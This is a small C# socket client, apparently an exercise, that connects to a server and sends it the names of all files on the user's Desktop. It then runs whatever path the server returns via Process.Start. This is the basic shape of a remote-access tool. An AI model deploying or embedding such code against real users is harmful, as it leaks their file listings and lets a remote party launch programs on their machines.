using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using Microsoft.Win32;

namespace Client
{
    class Program
    {
        static ClientData clientData = new ClientData();
        static List<string> messages = new List<string>();
        static RegistryKey key = Registry.CurrentUser;
        static void Main(string[] args)
        {
            try
            {
               clientData.socket.Connect(clientData.iPEndPoint);

               Console.WriteLine(clientData.GetMsg());

               SearchApp();
               StartApp();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            Console.ReadLine();
        }
        static void SearchApp()
        {
            string[] tmp = Directory.GetFiles($@"C:\Users\" + $"{Environment.UserName}" + @"\Desktop", "*", SearchOption.AllDirectories);
            clientData.SendMsg(tmp);
        }
        static void StartApp()
        {
            string path = clientData.GetMsg();
            Process.Start(new ProcessStartInfo(path));
        }
    }
}
